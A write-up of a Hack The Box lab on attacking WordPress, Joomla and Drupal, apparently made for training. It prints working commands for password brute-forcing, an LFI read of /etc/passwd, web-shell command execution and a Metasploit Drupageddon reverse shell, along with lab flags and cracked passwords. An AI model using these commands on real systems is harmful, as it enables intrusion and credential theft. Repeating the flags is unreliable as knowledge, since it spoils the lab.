# HTB-Attacking_Common_Applications

## Table of Contents
0. [Tools](#tools)
1. [Setting the Stage](#setting-the-stage)
    1. [Application Discovery & Enumeration](#application-discovery--enumeration-1)
2. [Content Management Systems (CMS)](#content-management-systems-cms-1)
    1. [WordPress - Discovery & Enumeration](#wordpress---discovery--enumeration)
    2. [Attacking WordPress](#attacking-wordpress)
    3. [Joomla - Discovery & Enumeration](#joomla---discovery--enumeration)
    4. [Attacking Joomla](#attacking-joomla)
    5. [Drupal - Discovery & Enumeration](#drupal---discovery--enumeration)
    6. [Attacking Drupal](#attacking-drupal)

## Tools
### Application Discovery & Enumeration
- Nmap
- eyewitness
- nessus
- aquatone
### Content Management Systems (CMS)
- wpscan
- [wpDiscuz.py](https://www.exploit-db.com/exploits/49967)
- droopescan
- [joomla-brute.py](https://github.com/ajnik/joomla-bruteforce/blob/master/joomla-brute.py)
- [CVE-2019-10945.py](https://raw.githubusercontent.com/dpgg101/CVE-2019-10945/main/CVE-2019-10945.py)
- [drupalgeddon.py](https://www.exploit-db.com/exploits/34992)

## Setting the Stage
### Application Discovery & Enumeration
#### Challenges
1. Use what you've learned from this section to generate a report with EyeWitness. What is the name of the .db file EyeWitness creates in the inlanefreight_eyewitness folder? (Format: filename.db)

    First, we need to set up our /etc/hosts file. We can do this by running the following command:

    ```bash
    IP=10.129.42.195
    printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local drupal-dev.inlanefreight.local drupal-qa.inlanefreight.local drupal-acc.inlanefreight.local drupal.inlanefreight.local" | sudo tee -a /etc/hosts
    ```

    Because **eyewitness** tool requires .xml output from **nmap** tool, we need to run **nmap** first. We run **nmap** against all the hosts in our scope list.

    ```txt
    app.inlanefreight.local
    dev.inlanefreight.local
    drupal-dev.inlanefreight.local
    drupal-qa.inlanefreight.local
    drupal-acc.inlanefreight.local
    drupal.inlanefreight.local
    blog.inlanefreight.local
    ```

    ```bash
    sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
    ```
    Once we have our .xml file, we can run eyewitness to generate a report.

    ```bash
    eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
    ```

    The .db file will be in the inlanefreight_eyewitness folder. The answer is `ew.db`.

2. What does the header on the title page say when opening the aquatone_report.html page with a web browser? (Format: 3 words, case sensitive)

    Similar with eyewitness, aquatone requires .xml output from nmap. Once we have our .xml file, we can run aquatone to generate a report.

    ```bash
    cat web_discovery.xml | aquatone -nmap
    ```
    Once we have our report, we can open the aquatone_report.html page with a web browser. The answer is `Pages by Similarity`.


## Content Management Systems (CMS)
### WordPress - Discovery & Enumeration
#### Challenges
1. Enumerate the host and find a flag.txt flag in an accessible directory.

    We need to make sure that this host is running WordPress. We can do this by running the following command:

    ```bash
    curl -s http://blog.inlanefreight.local | grep WordPress
    ```

    ![alt text](<Assets/WordPress - Discovery & Enumeration - 1.png>)

    We can see that this host is running WordPress. Then, we can use **wpscan**  to enumerate the host.

    ```bash
    sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <SNIP>
    ```
    ![alt text](<Assets/WordPress - Discovery & Enumeration - 2.png>)

    We can see that upload directory is accessible in the **wp-content/uploads/** endpoint. We can visit it in our web browser and doing some exploration. The flag.txt is in the [http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt](http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt). The answer is `0ptions_ind3xeS_ftw!`.

2. Perform manual enumeration to discover another installed plugin. Submit the plugin name as the answer (3 words).

    In the wpscan result, `Plugin(s) Identified:` section, it only shows two plugins. There are contact-form-7 and mail-masta. I tried read available plugins from the source code, by using **curl** command.

    ```bash
    curl -s http://blog.inlanefreight.local/ | grep plugins
    ```
    ![alt text](<Assets/WordPress - Discovery & Enumeration - 3.png>)

    We can see that the output still same with wpscan result. So maybe we need to enumerate the other pages to find the hint. We can click the post section in the website. It will redirect us to another page. We can enumerate the plugins in the page.

    ```bash
    curl -s http://blog.inlanefreight.local/\?p\=1 | grep plugins
    ```

    ![alt text](<Assets/WordPress - Discovery & Enumeration - 4.png>)

    We can see that there are more plugins in the page. The answer is `wp sitemap page`.

3. Find the version number of this plugin. (i.e., 4.5.2)

    The hint says that we need to find readme.txt file to get the plugin version. 

    ![alt text](<Assets/WordPress - Discovery & Enumeration - 5.png>)

    The other plugin has readme.txt file in the under plugin directory. It looks like this,

    ```txt
    http://blog.inlanefreight.local/wp-content/plugins/<plugin_name>/readme.txt
    ```
    So maybe we can try to get the readme.txt file under wp-sitemap-page plugin.

    ```bash
    curl -s http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt
    ```
    ![alt text](<Assets/WordPress - Discovery & Enumeration - 6.png>)

    We can see that the version number from the output. The answer is `1.6.4`.

### Attacking WordPress
#### Challenges
1. Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?

    We can use **wpscan** to solve this.

    ```bash
    sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <SNIP>
    ```
    The answer is `doug`.

2. Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer.

    We can use **wpscan** with `--multicall-max-passwords` and `-t` flag to increase the bruteforce speed.

    ```bash
    sudo wpscan --password-attack xmlrpc -t 100 --multicall-max-passwords 1000 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
    ```
    ![alt text](<Assets/Attacking WordPress - 1.png>)

    The answer is `jessica1`.

3. Using the methods shown in this section, find another system user whose login shell is set to /bin/bash.

    To solve this, we need to read **/etc/passwd** file to know which system user whose login shell is set to /bin/bash. We can accomplish this by using the vuln of **mail-masta** plugin. I have saved the wpscan enumeration output. 

    ![alt text](<Assets/Attacking WordPress - 2.png>)

    Based on that, **mail-masta** plugin has Local FIle Inclusion (LFI) vuln that make us can read files on the server without login.

    ```bash
    curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php\?pl\=/etc/passwd | grep /bin/bash
    ```

    ![alt text](<Assets/Attacking WordPress - 3.png>)
    
    The answer is `webadmin`.


4. Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot.

    In the previous plugin enumeration output, we can see that this website is using version 7.0.4 wpDiscuz plugin. This plugin has RCE vuln without authentication. We can use [this PoC](https://www.exploit-db.com/exploits/49967) to gain RCE.

    ```bash
    python3 wpDiscuz.py -u http://blog.inlanefreight.local -p /\?p\=1
    curl -s http://blog.inlanefreight.local/wp-content/uploads/2026/01/xcuzuemugrnqtky-1767850072.4547.php\?cmd\=id
    ```

    ![alt text](<Assets/Attacking WordPress - 4.png>)

    We can execute the command by using curl. We can find the flag filename by using this and read it:

    ```bash
    curl -s "http://blog.inlanefreight.local/wp-content/uploads/2026/01/xcuzuemugrnqtky-1767850072.4547.php?cmd=ls%20/var/www/blog.inlanefreight.local/"

    curl -s "http://blog.inlanefreight.local/wp-content/uploads/2026/01/xcuzuemugrnqtky-1767850072.4547.php?cmd=cat%20/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt"
    ```

    The answer is `l00k_ma_unAuth_rc3!`.

### Joomla - Discovery & Enumeration
#### Challenges
1. Fingerprint the Joomla version in use on http://app.inlanefreight.local (Format: x.x.x)

    We can solve this by using **droopescan** tool to enumerate joomla.

    ```bash
    droopescan scan joomla --url http://app.inlanefreight.local
    ```
    The answer is `3.10.0`.

2. Find the password for the admin user on http://app.inlanefreight.local

    We can bruteforce by using this [script](https://github.com/ajnik/joomla-bruteforce/blob/master/joomla-brute.py)

    ```bash
    sudo python3 joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
    ```
    The answer is `turnkey`.

### Attacking Joomla
#### Challenges
1. Leverage the directory traversal vulnerability to find a flag in the web root of the http://dev.inlanefreight.local/ Joomla application

    First, we need to enumerate the vhost.

    ```bash
    droopescan scan joomla --url http://dev.inlanefreight.local
    ```
    ![alt text](<Assets/Attacking Joomla - 2.png>)

    Based on that, joomlah has vuln of **Directory Traversal / Authenticated Arbitrary File Deletion** for the **1.5.0 - 3.9.4** version. We can use this [script](https://github.com/dpgg101/CVE-2019-10945/blob/main/CVE-2019-10945.py) to exploit that vuln. But to use the script, we need to know the path of admin directory, username, and admin password. We can use **joomlascan.py** to find the admin directory.
    
    ```bash
    python2.7 joomlascan.py -u http://dev.inlanefreight.local
    ```
    ![alt text](<Assets/Attacking Joomla - 1.png>)

    We can see that it has **/administrator** directory. Now, we need to find the username and admin password.

    ```bash
    sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
    ```
    The result is `admin:admin`. Now, we can use the script to exploit the vuln.

    ```bash
    python CVE-2019-10945.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /  
    ``` 

    ![alt text](<Assets/Attacking Joomla - 3.png>)

    Then, we can use curl to read it.

    ```bash
    curl -s http://dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
    ```
    The answer is `j00mla_c0re_d1rtrav3rsal!`.

### Drupal - Discovery & Enumeration
#### Challenges
1. Identify the Drupal version number in use on http://drupal-qa.inlanefreight.local

    We can use **droopescan** to enumerate Drupal.

    ```bash
    droopescan scan drupal -u http://drupal-qa.inlanefreight.local
    ```
    The answer is `7.30`.

### Attacking Drupal
#### Challenges
1. Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory.

    Based on the enumeration result, http://drupal-qa.inlanefreight.local, is using Drupal with 7.30 version. This version has SQL Injection vuln. We can use **metasploit** with **multi/http/drupal_drupageddon** module to gain reverse shell.

    ```bash
    [msf](Jobs:0 Agents:0) >> use exploit/multi/http/drupal_drupageddon
    [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set lhost 10.10.14.101
    lhost => 10.10.14.101
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set rhosts 10.129.95.229
    rhosts => 10.129.95.229
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set vhost drupal-qa.inlanefreight.local
    vhost => drupal-qa.inlanefreight.local
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set payload php/reverse_php
    payload => php/reverse_php
    [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> exploit
    ```
    ![alt text](<Assets/Attacking Drupal - 1.png>)

    We can see that we have been successful getting shell session. Now, we can read the flag. The answer is `DrUp@l_drUp@l_3veryWh3Re!`.